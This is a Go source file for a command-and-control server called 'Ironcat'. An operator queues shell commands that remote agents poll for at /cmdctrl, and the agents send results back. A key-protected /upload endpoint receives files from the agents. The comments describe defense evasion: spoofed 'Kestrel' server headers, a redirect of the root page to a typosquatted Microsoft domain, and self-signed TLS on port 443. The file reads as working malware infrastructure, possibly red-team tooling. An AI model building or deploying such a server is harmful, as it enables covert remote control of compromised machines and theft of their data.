package main

import (
	"bufio"
	"bytes"
	"crypto/ecdsa"
	"crypto/ed25519"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
)

//Add redirect for hitting the wrong API endpoint
//Change User Agent with switch from default, to common, to random selection from a list!
//Can add randomization of API endoints...whoa.

// certificate generation code * clean up ancilliary comments
var (
	host       string        = "127.0.0.1,localhost" //"Comma-separated hostnames and IPs to generate a certificate for")
	validFrom  string        = "Jan 1 15:04:05 2026" //"Creation date formatted as Jan 1 15:04:05 2011")
	validFor   time.Duration = 365 * 24 * time.Hour  //"Duration that certificate is valid for")
	isCA       bool          = false                 //"whether this cert should be its own Certificate Authority")
	rsaBits    int           = 2048                  //"Size of RSA key to generate. Ignored if --ecdsa-curve is set")
	ecdsaCurve string        = "P384"                //, "ECDSA curve to use to generate a key. Valid values are P224, P256 (recommended), P384, P521")
	ed25519Key bool          = false                 //, "Generate an Ed25519 key")
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func publicKey(priv any) any {
	switch k := priv.(type) {
	case *rsa.PrivateKey:
		return &k.PublicKey
	case *ecdsa.PrivateKey:
		return &k.PublicKey
	case ed25519.PrivateKey:
		return k.Public().(ed25519.PublicKey)
	default:
		return nil
	}
}

//end certificate generation options

// ***Upgrade****/add logging for malware activity later migrate to a db redis or mongo.
func malware_log_create() {
	dt := time.Now()

	logName := "/var/log/ironcat-malware.log" + dt.String()
	f, err := os.Create(logName)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()
}

func malware_log(message string) {
	f, err := os.OpenFile("/var/log/ironcat-malware.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	msg := message
	_, err2 := f.WriteString(msg)
	if err2 != nil {
		log.Fatal(err)
	}
	defer f.Close()
}

type operatorState struct {
	mu      sync.RWMutex
	mode    string
	command string
}

func newOperatorState() *operatorState {
	return &operatorState{mode: "0"}
}

func (s *operatorState) setMode(m string) {
	m = strings.TrimSpace(m)
	switch m {
	case "0", "1", "2":
		s.mu.Lock()
		s.mode = m
		s.mu.Unlock()
		fmt.Println("Setting Mode for All Agents To:", m)
	default:
		fmt.Println("Invalid mode. Use 0, 1, or 2.")
	}
}

func (s *operatorState) getMode() string {
	s.mu.RLock()
	defer s.mu.RUnlock()
	return s.mode
}

func (s *operatorState) setCommand(cmd string) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		fmt.Println("No command queued (empty input).")
		return
	}

	s.mu.Lock()
	s.command = cmd
	s.mu.Unlock()
	fmt.Println("Queued command:", cmd)
}

func (s *operatorState) popCommand() (string, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.command == "" {
		return "", false
	}
	cmd := s.command
	s.command = ""
	return cmd, true
}

func startOperatorLoop(state *operatorState) {
	fmt.Println("Operator console ready.")
	fmt.Println("Commands: mode <0|1|2>, cmd <command>, or a bare command line (queues command and sets mode 2).")

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		lower := strings.ToLower(line)
		switch {
		case lower == "0" || lower == "1" || lower == "2":
			state.setMode(line)
		case strings.HasPrefix(lower, "mode "):
			state.setMode(strings.TrimSpace(line[5:]))
		case strings.HasPrefix(lower, "cmd "):
			state.setCommand(strings.TrimSpace(line[4:]))
			state.setMode("2")
		default:
			state.setCommand(line)
			state.setMode("2")
		}
	}

	if err := scanner.Err(); err != nil {
		log.Printf("operator input loop stopped: %v", err)
	}
}

func main() {

	state := newOperatorState()
	go startOperatorLoop(state)

	fmt.Printf("Launching Ironcat Server")
	r := gin.Default()
	r.LoadHTMLGlob("*.html")
	r.Use(func(c *gin.Context) {
		c.Writer.Header().Set("Server", "Kestrel")
		c.Writer.Header().Set("tls_version", "tls1.3")
		c.Writer.Header().Set("x-rtag", "ARRPrd")
	})

	//displays index.html use for defense evasion
	r.GET("/", func(c *gin.Context) {

		c.Redirect(301, "https://micorosoft.com")

	})

	r.GET("/ironcat", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"message": "We create our own demons.",
		})
	})

	r.POST("/upload", func(c *gin.Context) {
		fmt.Printf("Upload Requested")
		d := c.Request.Header.Get("Domain")
		k := c.Request.Header.Get("Key")
		if k == "invincibleironcat" {
			// single file
			file, err := c.FormFile("file")
			check(err)
			log.Println(file.Filename)
			dst := "./" + d + "/" + file.Filename
			// Upload the file to specific dst.
			c.SaveUploadedFile(file, dst)
		}
	})

	r.GET("/checkin", func(c *gin.Context) {
		mode := state.getMode()
		c.Writer.Header().Set("Mode", mode)
		c.HTML(http.StatusOK, "index.html", nil)
	})

	r.GET("/cmdctrl", func(c *gin.Context) {
		if commandInput, ok := state.popCommand(); ok {
			c.JSON(http.StatusOK, gin.H{"cmd": commandInput})
			return
		}
		c.Status(http.StatusNoContent)
	})

	r.POST("/cmdctrl", func(c *gin.Context) {
		buf := new(bytes.Buffer)
		if _, err := io.Copy(buf, c.Request.Body); err != nil {
			c.Status(http.StatusBadRequest)
			return
		}
		str := strings.TrimSpace(buf.String())
		if str != "" {
			fmt.Println(str)
		}
		c.Status(http.StatusOK)
	})

	//Run on Port 80 in HTML
	//r.Run("0.0.0.0:80") // listen and serve on 0.0.0.0:8080 (for windows "localhost:8080")

	//NEW Generate TLS Keys

	var priv any
	var err error
	switch ecdsaCurve {
	case "":
		if ed25519Key {
			_, priv, err = ed25519.GenerateKey(rand.Reader)
		} else {
			priv, err = rsa.GenerateKey(rand.Reader, rsaBits)
		}
	case "P224":
		priv, err = ecdsa.GenerateKey(elliptic.P224(), rand.Reader)
	case "P256":
		priv, err = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	case "P384":
		priv, err = ecdsa.GenerateKey(elliptic.P384(), rand.Reader)
	case "P521":
		priv, err = ecdsa.GenerateKey(elliptic.P521(), rand.Reader)
	default:
		log.Fatalf("Unrecognized elliptic curve: %q", ecdsaCurve)
	}
	if err != nil {
		log.Fatalf("Failed to generate private key: %v", err)
	}
	// ECDSA, ED25519 and RSA subject keys should have the DigitalSignature
	// KeyUsage bits set in the x509.Certificate template
	keyUsage := x509.KeyUsageDigitalSignature
	// Only RSA subject keys should have the KeyEncipherment KeyUsage bits set. In
	// the context of TLS this KeyUsage is particular to RSA key exchange and
	// authentication.
	if _, isRSA := priv.(*rsa.PrivateKey); isRSA {
		keyUsage |= x509.KeyUsageKeyEncipherment
	}

	var notBefore time.Time
	if len(validFrom) == 0 {
		notBefore = time.Now()
	} else {
		notBefore, err = time.Parse("Jan 2 15:04:05 2006", validFrom)
		if err != nil {
			log.Fatalf("Failed to parse creation date: %v", err)
		}
	}

	notAfter := notBefore.Add(validFor)

	serialNumberLimit := new(big.Int).Lsh(big.NewInt(1), 128)
	serialNumber, err := rand.Int(rand.Reader, serialNumberLimit)
	if err != nil {
		log.Fatalf("Failed to generate serial number: %v", err)
	}
	// Change template
	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject: pkix.Name{
			Organization: []string{"Stark Industries"},
		},
		NotBefore: notBefore,
		NotAfter:  notAfter,

		KeyUsage:              keyUsage,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}

	hosts := strings.Split(host, ",")
	for _, h := range hosts {
		if ip := net.ParseIP(h); ip != nil {
			template.IPAddresses = append(template.IPAddresses, ip)
		} else {
			template.DNSNames = append(template.DNSNames, h)
		}
	}

	if isCA {
		template.IsCA = true
		template.KeyUsage |= x509.KeyUsageCertSign
	}

	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, publicKey(priv), priv)
	if err != nil {
		log.Fatalf("Failed to create certificate: %v", err)
	}

	certOut, err := os.Create("cert.pem")
	if err != nil {
		log.Fatalf("Failed to open cert.pem for writing: %v", err)
	}
	if err := pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: derBytes}); err != nil {
		log.Fatalf("Failed to write data to cert.pem: %v", err)
	}
	if err := certOut.Close(); err != nil {
		log.Fatalf("Error closing cert.pem: %v", err)
	}
	log.Print("wrote cert.pem\n")

	keyOut, err := os.OpenFile("key.pem", os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		log.Fatalf("Failed to open key.pem for writing: %v", err)
		return
	}
	privBytes, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		log.Fatalf("Unable to marshal private key: %v", err)
	}
	if err := pem.Encode(keyOut, &pem.Block{Type: "PRIVATE KEY", Bytes: privBytes}); err != nil {
		log.Fatalf("Failed to write data to key.pem: %v", err)
	}
	if err := keyOut.Close(); err != nil {
		log.Fatalf("Error closing key.pem: %v", err)
	}
	log.Print("wrote key.pem\n")

	// Reguired to Run in TLS
	r.RunTLS("0.0.0.0:443", "cert.pem", "key.pem")

}
